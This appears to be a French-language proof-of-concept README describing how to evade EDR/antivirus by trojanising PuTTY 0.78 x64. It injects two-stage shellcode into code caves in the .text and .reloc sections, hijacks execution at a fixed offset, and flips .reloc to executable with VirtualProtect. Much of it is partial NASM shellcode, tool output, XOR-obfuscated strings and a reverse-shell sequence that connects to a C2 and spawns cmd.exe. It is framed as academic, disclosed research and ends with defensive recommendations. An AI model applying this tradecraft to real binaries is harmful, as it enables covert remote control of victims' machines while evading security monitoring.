# PoC – ByPass EDR/AV USERLAND, Code Cave Injection & Two-Stage Shellcode via PE x64 Section Manipulation

**EDR bypass** par injection two-stage dans les sections `.text` / `.reloc` d'un binaire signé (Putty 0.78 x64), sans création de nouvelle section, sans IAT hookée, sans région RWX sur disque.


**Binaire cible** : `putty.exe` — Putty 0.78 Win64 officiel  
**OS victime** : Windows 10 22H2 / Windows 11 23H2 (kernel32.dll offset validé sur ces builds)  
**Validé contre** : Un nombre conséquent de EDR du marché  
**Refusé contre** : CrowdStrike (SHA256 non conforme à Putty, la technique n'est pas signalée)

---

## Explication et disclaimer

Ce PoC a été développé dans le cadre d'un mémoire de recherche sur les méthodes forensics des PE.

J'ai signalé ce problème à certains gros éditeurs en mai 2025 (ignoré) et à l'ANSSI/CERT en mi-juin 2026, cela fait maintenant 90j et avec leur autorisation, je publie mes travaux.

**Aucun outil d'attaques, ou de shellcode ne sera fourni à l'intérieur de ce PoC.**



## Principe

Le PoC exploite le différentiel entre `SectionAlignment` du format PE pour créer un code cave exécutable dans `.text` sans toucher aux autres sections. Un shellcode Stage 1 (~490 octets) y est injecté ; il retourne les permissions de `.reloc` en R-X à runtime via `VirtualProtect`, puis jump vers un reverse shell complet (~800 octets) logé dans `.reloc`. À noter que le shellcode du Stage 2 est à l'imagination de l'attaquant.

L'entrée se fait par hijack de flux d'exécution à l'offset `0x55D4` de Putty (point d'appui post-authentification utilisateur), avec restauration complète du contexte CPU avant retour au flux normal.

**L'exploit s'exécute avec les permissions qu'avec lesquelles l'user (ou autre) a lancé le PE vérolé**

![alt text](img/flow_exec.png)

---

## Flux d'exécution

```
putty.exe démarre normalement
        ↓
Utilisateur clique "Open" → hijack offset 0x55D4 → JMP code cave (.text)
        ↓
Stage 1 : résolution de VirtualProtect via RSI (GetProcAddress déjà dans registre)
          → VirtualProtect(.reloc, R-- → R-X)
          → JMP offset 0x19B000 (.reloc)
        ↓
Stage 2 : résolution dynamique ws2_32 → WSAStartup → WSASocketA → connect → CreateProcessA(cmd.exe)
        ↓
Restauration : copie de l'instruction originale (LEA RCX, [RDI+0x84])
               → retour offset 0x55DB, exécution normale de Putty
```
---

## Démonstration

Bypass Microsoft Endpoint

<video src="img/demo.mp4" controls width="600"></video>

---

## Modification PE

### Découverte du codecave alignement dans `.text`

```python
python code_caver.py -f putty.exe
[+] Minimum code cave size: 300
[+] Padding bytes: 0x00 (NUL), 0xCC (INT3)
[+] Image Base:  0x00400000
[+] Loading "putty.exe"...

[!] ASLR is enabled. Virtual Address (VA) could be different once loaded in memory.

[+] Looking for code caves...
[+] Code cave found in .text 	Size: 442 bytes <------ Natural code cave with exec perm
    Start RA: 0x000ED646  Start VA: 0x004EE246
    End RA:   0x000ED7FF  End VA:   0x004EE3FF
    Fill: 0xCC (INT3)  Perm: R-X  Suitability: GOOD (RX)

[+] Code cave found in .00cfg 	Size: 459 bytes
    Start RA: 0x00138635  Start VA: 0x0053F035
    End RA:   0x001387FF  End VA:   0x0053F1FF
    Fill: 0x00 (NUL)  Perm: R--  Suitability: UNSUITABLE

[+] Code cave found in .tls 	Size: 512 bytes
    Start RA: 0x0013B400  Start VA: 0x00543000
    End RA:   0x0013B5FF  End VA:   0x005431FF
    Fill: 0x00 (NUL)  Perm: RW-  Suitability: POSSIBLE (RW)

[+] Code cave found in .rsrc 	Size: 3677 bytes
    Start RA: 0x00141F5B  Start VA: 0x0054B75B
    End RA:   0x00142DB7  End VA:   0x0054C5B7
    Fill: 0x00 (NUL)  Perm: R--  Suitability: UNSUITABLE

[+] Code cave found in .rsrc 	Size: 3987 bytes
    Start RA: 0x00142E27  Start VA: 0x0054C627
    End RA:   0x00143DB9  End VA:   0x0054D5B9
    Fill: 0x00 (NUL)  Perm: R--  Suitability: UNSUITABLE

[+] Code cave found in .rsrc 	Size: 4027 bytes
    Start RA: 0x00143EC0  Start VA: 0x0054D6C0
    End RA:   0x00144E7A  End VA:   0x0054E67A
    Fill: 0x00 (NUL)  Perm: R--  Suitability: UNSUITABLE

[+] Found 1 suitable caves for code execution
```


### Extension de la code cave `.reloc`

```python
# CodeCaveExtenderAdvanced.py
C:\Users\ratus\Desktop\Decompile\script>python CodeCaveExtenderAdvanced.py putty.exe putty_demonstration.exe --section .reloc 800 --expand

File Alignment: 0x200
Section Alignment: 0x1000

Modifying .reloc section:
Original Virtual Size: 0x000021B8
Original Virtual Address: 0x001A2008
Original Size of Raw Data: 0x00002200
Added 1024 bytes of padding to raw data
New Virtual Size: 0x000024D8
New Virtual Address: 0x001A2000
New Size of Raw Data: 0x00002600
Code cave details:
Start RVA: 0x001A41B8
End RVA: 0x001A44D8
Size: 0x320 bytes
Modified PE file saved to: putty_demonstration.exe
Operation completed successfully!
```

Le script modifie uniquement la taille de `.reloc` dans le PE header. Aucune nouvelle section n'est créée. 

### Injection `.reloc`

`.reloc` est une section de relocation statique, rarement exécutée sur des binaires 64-bit (les relocations ASLR sont traitées au load time par le loader). Elle est grande (~plusieurs KB disponibles), ses permissions sont R-- sur disque : le Stage 2 n'est pas exécutable jusqu'à l'appel `VirtualProtect` du Stage 1 à runtime.

### Hijack du flux

Offset `0x55D4` : instruction `CALL [rbx+something]` dans la procédure "Open connection". Remplacée par un `JMP rel32` vers le début du code cave Stage 1. L'instruction originale est copiée et réexécutée après le payload (restauration propre).

---

## Stage 1 — Shellcode `.text` (~490 octets)

**Objectif** : changer les permissions de `.reloc` et passer la main au Stage 2.

**Contrainte critique** : tenir dans le code cave disponible après extension de `.text` (≈490 octets). Pas de place pour une résolution PEB/LDR complète.

**Solution** : au point de hijack `0x55D4`, le registre `RSI` contient déjà l'adresse de `GetProcAddress` dans le contexte d'exécution de Putty. On réutilise ce contexte directement — seule `VirtualProtect` est résolue. Grâce à ça on arrive à drastiquement descendre la taille en octets du shellcode, chaque octet dans ce contexte vaut son pesant de cacahuètes.
![alt text](img/image.png)

```
[BITS 64]
section .data
    ; String "VirtualProtect" XORée avec 0x41
    virtualprotect db 0x17, 0x28, 0x33, 0x35, 0x34, 0x20, 0x2D, 0x11, 0x33, 0x2E, 0x35, 0x24, 0x22, 0x35, 0x41
section .text
global start
start:
    push rax
    push rcx
    push rdx
    push rbp
    push rsi
    push rdi
    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15
    mov rbx, rsp
    
    ; GetProcAddress est dans RSI
    mov rax, rsi
    mov r15, rsi        ; Sauvegarder GetProcAddress dans R15
    sub rax, 0x1B200    ; Base kernel32
    mov r12, rax        ; Sauvegarder base kernel32 dans R12
    mov r14, r13;R13 contient nativement la base
    add r14, 0x19B000; Ajout de l'offset de .data
    ; RÉSERVER TOUT L'ESPACE NÉCESSAIRE AU DÉBUT
    sub rsp, 64
    mov r10, 0x41       ; Clé XOR
    ; Sauvegarde de l'adresse cible pour la chaîne décodée
    lea rbp, [rsp+40]   ; Sauvegarde de l'adresse dans RBP
    ; Décoder VirtualProtect
    lea rsi, [rel virtualprotect]
    mov rdi, rbp        ; Utiliser l'adresse sauvegardée
    mov rcx, 15         ; Longueur de "VirtualProtect\0"

decode_virtualprotect:
    --- [Shellcode coupé] ---

db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
```
### Exécution après le shellcode stage 1          

![alt text](img/image-1.png)
---

## Stage 2 — Reverse shell `.reloc` (~800 octets)

C'est à l'imagination de l'attaquant, mais toujours en respectant les contraintes d'un EDR (pas de whoami si on est en reverse shell, ou on ne chiffre pas les gardes-fous .docx des ransomblock des EDR etc...), grâce à cette méthode la taille n'est plus un problème vu que l'on étend une section qui ne bouge pas de toute manière, même insérer 10Mo de shellcode ne pose aucun souci.

**Objectif** : connexion TCP sortante vers le C2, lancement de `cmd.exe` avec I/O redirigée sur la socket.

**Séquence** :

1. Déchiffrement XOR 0x41 des strings sensibles dans des buffers stack temporaires
2. `LoadLibraryA("ws2_32.dll")`
3. `WSAStartup(0x0202)`
4. `WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)`
5. `connect(sock, &sockaddr_C2, 16)` — IP/port encodés little-endian en dur
6. `STARTUPINFO.hStdInput/Output/Error = sock`
7. `CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)`

**Strings obfusquées (XOR 0x41)** : `ws2_32.dll`, `WSAStartup`, `WSASocketA`, `connect`, `cmd.exe` — aucune en clair dans le binaire, décodées dans des buffers stack volatiles.



```
[BITS 64]

section .data
    ; Chaînes XORées avec 0x41
    loadlibrary db 0x0d, 0x2e, 0x20, 0x25, 0x0d, 0x28, 0x23, 0x33, 0x20, 0x33, 0x38, 0x00, 0x41  ; "LoadLibraryA" XOR 0x41
    ws32       db 0x36, 0x32, 0x73, 0x1e, 0x72, 0x73, 0x6f, 0x25, 0x2d, 0x2d, 0x41  ; "ws2_32.dll" XOR 0x41
    wsastartup  db 0x16, 0x12, 0x00, 0x12, 0x35, 0x20, 0x33, 0x35, 0x34, 0x31, 0x41  ; "WSAStartup" XOR 0x41
    
    ; Chaînes pour reverse shell - à ajouter selon besoin
    --- [Shellcode coupé] ---
	
	
	createproc db 0x02, 0x33, 0x24, 0x20, 0x35, 0x24, 0x11, 0x33, 0x2e, 0x22, 0x24, 0x32, 0x32, 0x00, 0x41; "CreateProcessA" XOR 0x41
    cmdexe     db 0x22, 0x2c, 0x25, 0x6f, 0x24, 0x39, 0x24, 0x41                                    ; "cmd.exe" XOR 0x41
	
	waitforsingleobject db 0x16, 0x20, 0x28, 0x35, 0x07, 0x2e, 0x33, 0x12, 0x28, 0x2f, 0x26, 0x2d, 0x24, 0x0e, 0x23, 0x2b, 0x24, 0x22, 0x35, 0x41  ; "WaitForSingleObject" XOR 0x41
	
section .text
global start

start:    
    ; GetProcAddress est dans RSI
    mov rax, r15

    --- [Shellcode coupé] ---

        ; Appel à CreateProcessA avec les bons arguments
    xor rcx, rcx                ; lpApplicationName = NULL
    mov rdx, r14                ; lpCommandLine = "cmd.exe"
    xor r8, r8                  ; lpProcessAttributes = NULL
    xor r9, r9                  ; lpThreadAttributes = NULL
    mov qword [rsp+32], 1       ; bInheritHandles = TRUE (5e arg)
    mov qword [rsp+40], 0x08000000       ; dwCreationFlags = 0 (6e arg) 0x08000000 = NO_WINDOWS
    mov qword [rsp+48], 0       ; lpEnvironment = NULL (7e arg)
    mov qword [rsp+56], 0       ; lpCurrentDirectory = NULL (8e arg)
    lea rax, [rsp+80]           ; STARTUPINFO (offset fixe)
    mov qword [rsp+64], rax     ; lpStartupInfo (9e arg)
    lea rax, [rsp+32]           ; PROCESS_INFORMATION (offset fixe)
    mov qword [rsp+72], rax     ; lpProcessInformation (10e arg)
	
    call r12                    ; Appel à CreateProcessA
    
	mov rsp, rbx 

	
	pop r15
	pop r14
	pop r13
	pop r12
	pop r11
	pop r10
	pop r9
	pop r8
	pop rdi
	pop rsi
	pop rbp
	pop rdx
	pop rcx
	pop rax

	
	db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90
	


; Sous-routine pour décoder les chaînes XORées
decode_string:
    ; RCX = longueur, RSI = source, RDI = destination, R10 = clé XOR
decode_loop:
	mov r10, 0x41               ; Clé XOR
    mov al, byte [rsi]
    xor al, r10b
    mov byte [rdi], al
    inc rsi
    inc rdi
    dec rcx
    jnz decode_loop
    ret
```

---

## Pourquoi ça passe les EDR

| Angle mort | Mécanisme exploité |
|---|---|
| Pas d'analyse sectionnelle par hash | Les EDR valident le hash global du PE, pas section par section |
| `VirtualProtect` ne peut physiquement pas être surveillé. | `VirtualProtect` est une brique élémentaire, quasiment tous les programmes l'appellent |
| `.reloc` considérée comme donnée passive | Aucun EDR testé ne monitore les exécutions depuis `.reloc` |
| XOR trivial non désobfusqué | Les signatures statiques cherchent les strings en clair |
| Absence de corrélation ETW | `VirtualProtect` + `CreateProcess` + connexion TCP sortante non corrélés causalement en < 50 ms |

---

## Résultats

J'ai réussi à bypass l'entièreté des EDR testés (environ 5), à ce jour, j'ai pu tester profondément (accès à la console + télémétrie poussée) ou Bypass avec Policy Bloquante + SOC derrière

Non bypass ?

- CrowdStrike m'a flag, mais cela n'a révélé que mon putty modifié (SHA256 cassé avec insertion des shellcodes) et non de la technique en elle-même. J'avoue ne pas avoir testé avec un software moins connu.


**Limites connues** : les offsets (`0x55D4`, `0x19B000`, kernel32 offset `0x1B200`) sont spécifiques au build exact de Putty 0.78 Win64 et aux versions Windows testées. Tout changement de build invalide les offsets. La taille du code cave dans la section `.text` n'est pas fixe entre chaque PE.

---

## Outils développés

| Script | Rôle |
|---|---|
| `CodeCaveExtenderAdvanced.py` | Extension du code cave `.reloc` (modification `SizeOfRawData`) |
| `offsetcalculator.py` | Calcul des offsets JMP relatifs (RVA → RAW offset fichier) |
| `iptohexa.py` | Conversion IP:Port en little-endian pour le shellcode Stage 2 |
| `AsciitoBIN.py` | Obfuscation XOR 0x41 des strings, sortie assembleur NASM |

**Dépendances** :
- NASM  — compilation des shellcodes
- x64dbg — debug et validation des offsets
- PE-Bear — analyse de la structure PE + Injection des jumps en RAW offset
- Python 3.x + `pefile` — scripts de manipulation PE

---

## Recommandations défensives

1. **Hash sectionnel au chargement** — valider l'intégrité de chaque section PE individuellement, pas seulement le hash global
2. **Détection contextuelle `VirtualProtect`** — alerter si la section cible est `.reloc` ou `.rdata` sans raison légitime au contexte
3. **Analyse entropique et émulation** — détecter les boucles de décodage XOR avant exécution

---

## Scope

PoC développé dans le cadre du Mastère Cybersécurité & Cloud IPSSI 2025–2026 ainsi que mon alternance à SOTERIA-LAB, supervisé initialement par Monsieur Pierre V, en environnement isolé et ou contrôlé.

**Auteur** : Louis G.

**Encadrement** : Pierre V. (SOTERIA-LAB)

---


## Note personnelle

* **Accessibilité de la technique :** Un *code cave* d'environ 400 octets n'est pas si difficile à identifier dans les PE modernes. Bien que ce PoC soit spécifique à `putty.exe`, le principe sous-jacent semble reproductible sur la quasi-totalité des binaires Windows x64.
* **Surveillance de `VirtualProtect` :** Chaque PE possède ses propres sections et spécificités. De plus, `VirtualProtect` reste une API fondamentale du système dont la surveillance contextuelle est complexe en raison de son volume d'appels légitimes très élevé à travers l'OS.
* **Compromis Performance/Détection :** Cette approche met en évidence le compromis permanent auquel font face les EDR entre la profondeur de l'analyse heuristique et l'impact sur les performances de la machine hôte. L'absence de détection ici montre que l'instrumentation *userland* de `VirtualProtect`, combinée à une exécution depuis une section passive comme `.reloc`, reste un vecteur d'évasion efficace. Ce mécanisme est souvent silencé par les éditeurs pour éviter les faux positifs sur des applications légitimes. En pratique, l'analyse comportementale continue et exhaustive de chaque processus s'avère trop lourde pour des architectures standards, laissant la place à des détections plus ciblées (signatures statiques, télémétrie post-exécution de commandes suspectes comme `whoami`, etc.).
* **Méthodologie de recherche :** Ayant développé cette approche de manière autonome avec l'appui d'outils d'IA, certaines méthodes d'implémentation peuvent s'écarter des standards conventionnels, mais elles valident empiriquement le concept.
* **Perspectives d'évolution et limites de test :** Faute d'accès à un environnement de laboratoire complet regroupant un ensemble des consoles de gestion et des solutions EDR du marché, plusieurs hypothèses n'ont pu être validées que par déduction. Disposer d'un tel environnement permettrait d'approfondir cet axe de recherche à double niveau, notamment pour répondre à des problématiques plus complexes :
* *L'injection ou le hijacking de DLL légitime pour héberger le Stage 2 altère-t-il significativement la télémétrie comportementale ?*
* *Le chargement et la localisation en mémoire RAM d'une ressource externe (par exemple, les pixels d'un fichier PNG) pour y exécuter un Stage 2 après altération des permissions via `VirtualProtect` permettent-ils de contourner l'analyse d'entropie statique ?*
